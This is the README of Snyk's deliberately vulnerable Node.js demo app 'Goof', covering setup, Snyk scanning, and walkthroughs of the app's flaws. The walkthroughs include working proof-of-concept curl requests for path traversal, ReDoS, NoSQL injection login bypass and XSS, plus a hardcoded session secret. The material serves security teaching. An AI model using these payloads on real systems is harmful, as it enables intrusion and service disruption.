# Goof - Snyk's vulnerable demo app
Snyk's vulnerable Node.js demo application, based on the [Dreamers Lab tutorial](http://dreamerslab.com/blog/en/write-a-todo-list-with-express-and-mongodb/).

## Features
This vulnerable app includes Vulnerable Code and Exploitable Packages to experiment with.

## Running Locally
Goof needs a MongoDB instance to run. You can run one locally using Docker. 

Note: You *have* to use an old version of MongoDB version due to some of these old libraries' database server APIs. MongoDB 3 is known to work ok.

```bash
echo "Start detached mongo with container port 27017 mapped to host port 27017"
docker run -d -p 27017:27017 mongo:3
```

```bash
git clone https://gitlab.com/tomas-snyk/nodejs-goof
npm install
npm start
```
This will run Goof locally, listening on port 3001 (http://localhost:3001)

### Cleanup
To bulk delete the current list of TODO items from the DB run:
```bash
npm run cleanup
```

## Scanning Goof for Vulnerabilities
You can use Snyk to find vulnerabilities in the Goof application. First, authenticate Snyk:

```bash
snyk auth
```

### Scanning for Vulnerable Open Source Libraries
After installing dependencies, you can use the Snyk CLI to test for Vulnerable Open Source Libraries.

```bash
npm install --package-lock
snyk test
```

You can upload these results to the Snyk UI to be notified in case of newly disclosed vulnerabilities.

```bash
snyk monitor
```

### Scanning for Base Image Vulnerabilities
Goof's `Dockerfile` makes use of a base image that is known to have system libraries with vulnerabilities.

To scan the image for vulnerabilities, first build the image, then run Snyk Container:
```bash
docker build -t goof:latest .
snyk container test goof:latest --file=Dockerfile
```

You can upload these results to Snyk to receive alerts for new vulnerabilities affecting your base image.
```bash
snyk container monitor goof:latest
```

### Scanning for Code Vulnerabilities
To find vulnerabilities in Goof's code, use Snyk Code SAST.

```bash
snyk code test
```

## Exploiting the vulnerabilities

This app uses npm dependencies holding known vulnerabilities, as well as insecure code that introduces code-level vulnerabilities.

The `exploits/` directory includes a series of steps to demonstrate each one.

### Vulnerabilities in open source dependencies

Here are the exploitable vulnerable packages:
- [st - Directory Traversal](https://snyk.io/vuln/npm:st:20140206)
- [ms - ReDoS](https://snyk.io/vuln/npm:ms:20151024)
- [marked - XSS](https://snyk.io/vuln/npm:marked:20150520)

### Vulnerabilities in code

* Open Redirect
* NoSQL Injection
* Code Injection
* Command execution
* Cross-site Scripting (XSS)
* Information exposure via Hardcoded values in code
* Security misconfiguration exposes server information 
* Insecure protocol (HTTP) communication 

#### Code injection

The page at `/account_details` is rendered as an Handlebars view.

The same view is used for both the GET request which shows the account details, as well as the form itself for a POST request which updates the account details. A so-called Server-side Rendering.

The form is completely functional. The way it works is, it receives the profile information from the `req.body` and passes it, as-is to the template. This however means, that the attacker is able to control a variable that flows directly from the request into the view template library.

You'd think that what's the worst that can happen because we use a validation to confirm the expected input, however the validation doesn't take into account a new field that can be added to the object, such as `layout`, which when passed to a template language, could lead to Local File Inclusion (Path Traversal) vulnerabilities. Here is a proof-of-concept showing it:

```sh
curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"username": "admin@snyk.io", "password": "SuperSecretPassword"}' 'http://localhost:3001/login'
```

```sh
curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"email": "admin@snyk.io", "firstname": "admin", "lastname": "admin", "country": "IL", "phone": "+972551234123",  "layout": "./../package.json"}' 'http://localhost:3001/account_details'
```

Actually, there's even another vulnerability in this code.
The `validator` library that we use has several known regular expression denial of service vulnerabilities. One of them, is associated with the email regex, which if validated with the `{allow_display_name: true}` option then we can trigger a denial of service for this route:

```sh
curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"`seq -s "" -f "<" 100000`\"}" 'http://localhost:3001/account_details'
```

The `validator.rtrim()` sanitizer is also vulnerable, and we can use this to create a similar denial of service attack:

```sh
curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"someone@example.com\", \"country\": \"nop\", \"phone\": \"0501234123\", \"lastname\": \"nop\", \"firstname\": \"`node -e 'console.log(" ".repeat(100000) + "!")'`\"}" 'http://localhost:3001/account_details'
```

#### NoSQL injection

A POST request to `/login` will allow for authentication and signing-in to the system as an administrator user.
It works by exposing `loginHandler` as a controller in `routes/index.js` and uses a MongoDB database and the `User.find()` query to look up the user's details (email as a username and password). One issue is that it indeed stores passwords in plaintext and not hashing them. However, there are other issues in play here.


We can send a request with an incorrect password to see that we get a failed attempt
```sh
echo '{"username":"admin@snyk.io", "password":"WrongPassword"}' | http --json $GOOF_HOST/login -v
```

And another request, as denoted with the following JSON request to sign-in as the admin user works as expected:
```sh
echo '{"username":"admin@snyk.io", "password":"SuperSecretPassword"}' | http --json $GOOF_HOST/login -v
```

However, what if the password wasn't a string? what if it was an object? Why would an object be harmful or even considered an issue?
Consider the following request:
```sh
echo '{"username": "admin@snyk.io", "password": {"$gt": ""}}' | http --json $GOOF_HOST/login -v
```

We know the username, and we pass on what seems to be an object of some sort.
That object structure is passed as-is to the `password` property and has a specific meaning to MongoDB - it uses the `$gt` operation which stands for `greater than`. So, we in essence tell MongoDB to match that username with any record that has a password that is greater than `empty string` which is bound to hit a record. This introduces the NoSQL Injection vector.

#### Open redirect

The `/admin` view introduces a `redirectPage` query path, as follows in the admin view:

```
<input type="hidden" name="redirectPage" value="<%- redirectPage %>" />
```

One fault here is that the `redirectPage` is rendered as raw HTML and not properly escaped, because it uses `<%- >` instead of `<%= >`. That itself, introduces a Cross-site Scripting (XSS) vulnerability via:

```
http://localhost:3001/login?redirectPage="><script>alert(1)</script>
```

To exploit the open redirect, simply provide a URL such as `redirectPage=https://google.com` which exploits the fact that the code doesn't enforce local URLs in `index.js:72`.

#### Hardcoded values - session information

The application initializes a cookie-based session on `app.js:40` as follows:

```js
app.use(session({
  secret: 'keyboard cat',
  name: 'connect.sid',
  cookie: { secure: true }
}))
```

As you can see, the session `secret` used to sign the session is a hardcoded sensitive information inside the code.

First attempt to fix it, can be to move it out to a config file such as:
```js
module.exports = {
    cookieSecret: `keyboard cat`
}
```

And then require the configuration file and use it to initialize the session.
However, that still maintains the secret information inside another file, and Snyk Code will warn you about it.

Another case we can discuss here in session management, is that the cookie setting is initialized with `secure: true` which means it will only be transmitted over HTTPS connections. However, there's no `httpOnly` flag set to true, which means that the default false value of it makes the cookie accessible via JavaScript. Snyk Code highlights this potential security misconfiguration so we can fix it. We can note that Snyk Code shows this as a quality information, and not as a security error.

Snyk Code will also find hardcoded secrets in source code that isn't part of the application logic, such as `tests/` or `examples/` folders. We have a case of that in this application with the `tests/authentication.component.spec.js` file. In the finding, Snyk Code will tag it as `InTest`, `Tests`, or `Mock`, which help us easily triage it and indeed ignore this finding as it isn't actually a case of information exposure.
